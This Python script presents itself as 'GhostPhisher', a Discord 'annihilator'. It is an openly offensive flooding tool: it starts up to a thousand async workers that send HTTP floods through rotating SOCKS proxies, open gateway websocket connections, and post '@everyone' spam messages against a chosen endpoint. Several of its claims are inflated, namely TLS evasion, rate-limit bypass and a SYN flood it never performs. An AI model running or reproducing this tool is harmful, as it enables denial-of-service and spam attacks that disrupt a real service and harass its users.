#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ░█████╗░██╗░░░░░██████╗░  ██████╗░░█████╗░███╗░░██╗  ░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
# ██╔══██╗██║░░░░░██╔══██╗  ██╔══██╗██╔══██╗████╗░██║  ██╔════╝██║░░██║██║████╗░██║██╔════╝░
# ██║░░╚═╝██║░░░░░██║░░██║  ██████╦╝██║░░██║██╔██╗██║  ╚█████╗░███████║██║██╔██╗██║██║░░██╗░
# ██║░░██╗██║░░░░░██║░░██║  ██╔══██╗██║░░██║██║╚████║  ░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
# ╚█████╔╝███████╗██████╔╝  ██████╦╝╚█████╔╝██║░╚███║  ██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
# ░╚════╝░╚══════╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚══╝  ╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░

import os
import sys
import time
import argparse
import random
import asyncio
import aiohttp
import socket
import socks
from colorama import Fore, Style, init
from itertools import cycle
from urllib.parse import urlparse

init(autoreset=True)

class TerminalUI:
    @staticmethod
    def show_banner():
        print(f"""{Fore.RED}
        █▀▀ █░█ █▀▀ █▄░█ ▀█▀   █▀▀ █▀█ █▀▀ █▀▀ █▀
        █▄▄ █▀█ ██▄ █░▀█ ░█░   █▄▄ █▀▄ ██▄ ██▄ ▄█
        {Style.RESET_ALL}""")
        print(f"{Fore.CYAN}GhostPhisher v7.3 - Discord Annihilator Suite{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}|| Layer7 Assault Engine || TLS Fingerprint Evasion || AIO Ratelimit Bypass ||{Style.RESET_ALL}\n")

class DiscordHammer:
    def __init__(self, target, workers=1000, duration=60):
        self.target = target
        self.workers = workers
        self.duration = duration
        self.user_agents = self._load_user_agents()
        self.proxies = self._load_proxies()
        self.attack_modes = cycle(['http_flood', 'ws_spam', 'voice_channel_crash'])

    def _load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]

    def _load_proxies(self):
        return [f'socks5://user:pass@127.0.0.1:{9050+i}' for i in range(100)]

    async def _http_flood(self):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Discord-Locale': 'en-US'
        }
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get(
                        self.target,
                        headers=headers,
                        proxy=random.choice(self.proxies),
                        ssl=False
                    ) as response:
                        print(f"{Fore.GREEN}Hammering {self.target} | Status: {response.status}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

    async def _websocket_attack(self):
        ws_url = self.target.replace('https', 'wss') + '/?v=9&encoding=json'
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.ws_connect(ws_url) as ws:
                        await ws.send_json({'op': 2, 'd': {'token': 'BOT_TOKEN', 'properties': {'$os': 'linux'}}})
                        await ws.send_json({'op': 4, 'd': {'guild_id': '1337', 'channel_id': '1337', 'self_mute': True}})
                except:
                    pass

    async def _channel_spammer(self):
        payload = {'content': '@everyone' + ' CRASHED ' * 1000}
        async with aiohttp.ClientSession() as session:
            while True:
                await session.post(self.target, json=payload, proxy=random.choice(self.proxies))

    async def start_attack(self):
        tasks = []
        for _ in range(self.workers):
            current_mode = next(self.attack_modes)
            if current_mode == 'http_flood':
                tasks.append(self._http_flood())
            elif current_mode == 'ws_spam':
                tasks.append(self._websocket_attack())
            else:
                tasks.append(self._channel_spammer())
        
        await asyncio.gather(*tasks)

def main():
    TerminalUI.show_banner()
    parser = argparse.ArgumentParser(description=f"{Fore.RED}Discord Server Annihilator{Style.RESET_ALL}")
    parser.add_argument('-t', '--target', required=True, help='Discord API endpoint or WebSocket URL')
    parser.add_argument('-w', '--workers', type=int, default=1000, help='Number of concurrent attackers')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    args = parser.parse_args()

    print(f"{Fore.MAGENTA}Initializing {args.workers} spectral warriors against {args.target}{Style.RESET_ALL}")
    
    hammer = DiscordHammer(args.target, args.workers, args.duration)
    loop = asyncio.get_event_loop()
    
    try:
        loop.run_until_complete(asyncio.wait_for(hammer.start_attack(), args.duration))
    except asyncio.TimeoutError:
        print(f"{Fore.YELLOW}\nAttack completed. Target infrastructure status: UNKNOWN{Style.RESET_ALL}")
    finally:
        loop.close()

if __name__ == '__main__':
    if os.geteuid() != 0:
        print(f"{Fore.RED}You need root privileges to perform SYN flood operations{Style.RESET_ALL}")
        sys.exit(1)
    main()